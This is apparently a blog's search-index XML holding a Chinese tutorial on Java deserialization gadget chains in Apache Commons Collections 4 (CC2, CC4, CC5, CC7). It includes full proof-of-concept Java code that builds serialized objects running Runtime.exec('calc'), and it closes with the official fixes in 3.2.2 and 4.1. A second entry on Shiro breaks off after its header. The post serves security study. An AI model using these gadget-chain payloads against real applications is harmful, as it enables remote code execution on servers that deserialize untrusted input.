<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java反序列化CommonsCollections利用链篇四</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E5%9B%9B/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>Apache Commons Collections是⼀个著名的辅助开发库，包含了⼀些Java中没有的数据结构和和辅助⽅法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p><p>Apache Commons Collections有以下两个分⽀版本： </p><p>commons-collections:commons-collections </p><p>org.apache.commons:commons-collections4</p><p>既然3.2.1中存在反序列化利⽤链，那么4.0版本是否存在呢？</p><h1 id="CC3等老链复用"><a href="#CC3等老链复用" class="headerlink" title="CC3等老链复用"></a>CC3等老链复用</h1><p>加入CC4依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>​修改代码导入包为：import org.apache.commons.collections4.*;<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201959823.png" alt="img"></p><p>LazyMap没有decorate方法。与之替换成了lazyMap方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="title function_">lazyMap</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> K, ? extends V&gt; factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>&lt;K,V&gt;(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​修改过后仍可以执行：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201959109.png" alt="img"></p><p>同理，可以试⼀下之前看过的CommonsCollections1、CommonsCollections3，都可以在commonscollections4中正常使⽤。</p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>除了⽼的⼏个利⽤链，ysoserial中还有几条针对CommonsCollection4新的利用链，回顾一下commons-collections这个包之所有能攒出那么多利⽤链，其根本原因就是其中的一些transform方法可以执行任意方法，其利用链就可总结为：<strong>从 Serializable#readObject() ⽅法到 Transformer#transform()。</strong></p><h2 id="PriorityQueue利⽤链"><a href="#PriorityQueue利⽤链" class="headerlink" title="PriorityQueue利⽤链"></a><strong>PriorityQueue利⽤链</strong></h2><p>按照规律，CC2中的就是从java.util.PriorityQueue#readObject方法到org.apache.commons.collections4.comparators.TransformingComparator#compare调用transform。</p><p>java.util.PriorityQueue#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>org.apache.commons.collections4.comparators.TransformingComparator#compare</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个方法是怎么拼接到一起的呢？</p><p>我们接着看PriorityQueue#readObject中调用的heapify方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进siftDown方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进siftDownUsingComparator方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第8行很明显调用了compare方法。</p><p>至此这就是一条完整的利用链，PriorityQueue#readObject-&gt;PriorityQueue#heapify-&gt;PriorityQueue#siftDown-&gt;PriorityQueue#siftDownUsingComparator-&gt;TransformingComparator#compare-&gt;InvokerTransformer#transform</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        transformingComparator.compare(Runtime.class,null);</span></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">4</span>,transformingComparator);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    size.set(priorityQueue,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//        priorityQueue.add(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">queueField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    queueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    queueField.set(priorityQueue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>,Runtime.class,<span class="number">2</span>,<span class="number">3</span>&#125;);</span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>观察ysoserial可以发现，commons-collections还存在CC4、CC5、CC7这几条利用链。浅浅分析一下。</p><p>CC4就是将命令执行的Runtim类改成代码执行的TemplatesImpl。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">    <span class="comment">// 设置_name不为空</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    <span class="comment">// 定义字节码，反射修改_bytecodes的值</span></span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Study\\java sec\\04\\target\\classes\\outCalc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    bytecodesField.set(templates,codes);</span><br><span class="line">    <span class="comment">// _tfactory赋值</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>((Transformer) instantiateTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        transformingComparator.compare(templates,null);</span></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">4</span>,  transformingComparator);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    size.set(priorityQueue,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//        priorityQueue.add(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">queueField</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    queueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    queueField.set(priorityQueue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>, TrAXFilter.class,<span class="number">2</span>,<span class="number">3</span>&#125;);</span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>Gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    TiedMapEntry.toString()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                ConstantTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p>这条链拼接的是BadAttributeValueExpException.readObject()和TiedMapEntry.toString()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line">    <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.lazyMap(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(Runtime.class);</span></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,Runtime.class);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    valField.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">    serialize(badAttributeValueExpException);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>Gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br></pre></td></tr></table></figure><p>这条链还是利用了LazyMap.get。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125; ,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    Map map1=LazyMap.lazyMap(hashMap1,transformerChain);</span><br><span class="line">    map1.put(<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">    map2.put(<span class="string">&quot;2&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(map1,<span class="number">1</span>);</span><br><span class="line">    hashtable.put(map2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    serialize(hashtable);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="commons-collections反序列化官⽅修复⽅法"><a href="#commons-collections反序列化官⽅修复⽅法" class="headerlink" title="commons-collections反序列化官⽅修复⽅法"></a><strong>commons-collections反序列化官⽅修复⽅法</strong></h1><p>问题：PriorityQueue的利⽤链是否⽀持在commons-collections 3中使⽤？</p><p>答案是不能的应为commons-collections 3中的TransformingComparator类没有实现 Serializable 接⼝的。</p><p>问题：commons-collections反序列化的修复。</p><p>Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2。</p><p>3.2.2新版代码中增加了⼀个⽅法FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置org.apache.commons.collections.enableUnsafeSerialization&#x3D;true，即默认情况下会 抛出异常。</p><p>4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化shiro漏洞</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96shiro%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96shiro%E6%BC%8F%E6%B4%9E/</url>
      
